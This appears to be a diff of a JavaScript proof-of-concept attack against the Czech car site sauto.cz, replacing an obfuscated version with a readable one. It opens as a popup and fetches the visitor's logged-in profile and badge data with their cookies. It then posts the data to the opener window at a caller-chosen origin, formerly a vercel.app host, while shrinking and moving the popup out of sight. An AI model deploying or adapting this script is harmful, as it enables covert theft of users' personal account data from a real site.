@@ -1,1 +1,74 @@
-function _0x3a65(_0x41f2e1,_0x30765b){const _0x1f170a=_0x1f17();return _0x3a65=function(_0x3a6590,_0x52a805){_0x3a6590=_0x3a6590-0x18b;let _0x572124=_0x1f170a[_0x3a6590];return _0x572124;},_0x3a65(_0x41f2e1,_0x30765b);}(function(_0x1149ef,_0x184dbb){const _0x2341dc=_0x3a65,_0x27681b=_0x1149ef();while(!![]){try{const _0x3cec69=-parseInt(_0x2341dc(0x198))/0x1+parseInt(_0x2341dc(0x190))/0x2+-parseInt(_0x2341dc(0x19b))/0x3*(-parseInt(_0x2341dc(0x19c))/0x4)+parseInt(_0x2341dc(0x19f))/0x5+parseInt(_0x2341dc(0x1a1))/0x6*(-parseInt(_0x2341dc(0x19e))/0x7)+parseInt(_0x2341dc(0x192))/0x8*(parseInt(_0x2341dc(0x18d))/0x9)+-parseInt(_0x2341dc(0x194))/0xa*(-parseInt(_0x2341dc(0x1a2))/0xb);if(_0x3cec69===_0x184dbb)break;else _0x27681b['push'](_0x27681b['shift']());}catch(_0x15eecb){_0x27681b['push'](_0x27681b['shift']());}}}(_0x1f17,0x427a7));let getUsersSelfDataComplete=![],getUserBadgeDataComplete=![];(function getUsersSelfData(){const _0x31c391=_0x3a65;fetch(_0x31c391(0x18b),{'method':'GET','credentials':_0x31c391(0x196),'headers':{'Accept':'application/json'}})[_0x31c391(0x199)](_0x16e18d=>_0x16e18d[_0x31c391(0x19d)]())['then'](_0x3fdae5=>{const _0x49333e=_0x31c391;window[_0x49333e(0x18c)][_0x49333e(0x1a4)]({'messageType':'getUsersSelfData','response':_0x3fdae5},_0x49333e(0x191)),getUsersSelfDataComplete=!![];})[_0x31c391(0x197)](_0x4bb09a=>{const _0x229055=_0x31c391;window[_0x229055(0x18c)][_0x229055(0x1a4)](_0x4bb09a,_0x229055(0x19a));});}(),function getUserBadgeData(){const _0x3cf6b2=_0x3a65;fetch('https://login.sauto.cz/api/v1/user/badge?service=sauto',{'method':_0x3cf6b2(0x1a3),'credentials':_0x3cf6b2(0x196),'headers':{'Accept':_0x3cf6b2(0x193)}})[_0x3cf6b2(0x199)](_0x1243d7=>_0x1243d7['json']())[_0x3cf6b2(0x199)](_0x45f2e1=>{const _0x4ddc38=_0x3cf6b2;window[_0x4ddc38(0x18c)][_0x4ddc38(0x1a4)]({'messageType':_0x4ddc38(0x195),'response':_0x45f2e1},_0x4ddc38(0x191)),getUserBadgeDataComplete=!![];})[_0x3cf6b2(0x197)](_0x7086e7=>{const _0x21ae97=_0x3cf6b2;window[_0x21ae97(0x18c)][_0x21ae97(0x1a4)](_0x7086e7,_0x21ae97(0x19a));});}(),setInterval(()=>{const _0xbd138f=_0x3a65;window[_0xbd138f(0x18f)](0x1,0x1),window[_0xbd138f(0x1a0)](0x270f,0x270f),getUsersSelfDataComplete&&getUserBadgeDataComplete&&window[_0xbd138f(0x18e)]();},0x1,!![]));function _0x1f17(){const _0xe50b4=['378191LruxlR','GET','postMessage','https://www.sauto.cz/api/v1/users/self','opener','567234fjFadu','close','resizeTo','583362AdQeJL','https://sauto.vercel.app','64VkTpbZ','application/json','10tZJFqx','getUserBadgeData','include','catch','423627lTrRCJ','then','https://sauto.vercel.app/','95547HuXoaw','4ClsIbD','json','243495lVXdFZ','212565aMGHKY','moveTo','36ppJDsO'];_0x1f17=function(){return _0xe50b4;};return _0x1f17();}
+const origin = (new URLSearchParams(window.location.search)).get('origin');
+
+let getUsersSelfDataComplete = false;
+let getUserBadgeDataComplete = false;
+
+(function getUsersSelfData() {
+    fetch(
+        'https://www.sauto.cz/api/v1/users/self',
+        {
+            method: "GET",
+            credentials: "include",
+            headers: {
+                'Accept': 'application/json',
+            },
+        },
+    )
+        .then(response => response.json())
+        .then((json) => {
+            window.opener.postMessage({
+                messageType: 'getUsersSelfData',
+                response: json
+            }, origin);
+        })
+        .catch(error => {
+            window.opener.postMessage({
+                messageType: 'getUsersSelfData',
+                response: error
+            }, origin);
+        })
+        .finally(() => {
+            getUsersSelfDataComplete = true;
+        });
+})();
+
+(function getUserBadgeData() {
+    fetch(
+        'https://login.sauto.cz/api/v1/user/badge?service=sauto',
+        {
+            method: "GET",
+            credentials: "include",
+            headers: {
+                'Accept': 'application/json',
+            },
+        },
+    )
+        .then(response => response.json())
+        .then((json) => {
+            window.opener.postMessage({
+                messageType: 'getUserBadgeData',
+                response: json,
+            }, origin);
+        })
+        .catch(error => {
+            window.opener.postMessage({
+                messageType: 'getUserBadgeData',
+                response: error,
+            }, origin);
+        })
+        .finally(() => {
+            getUserBadgeDataComplete = true;
+        });
+})();
+
+setInterval(
+    () => {
+        window.resizeTo(1, 1);
+        window.moveTo(9999, 9999);
+        if (getUsersSelfDataComplete && getUserBadgeDataComplete) {
+            window.close();
+        }
+    },
+    1,
+    true
+);
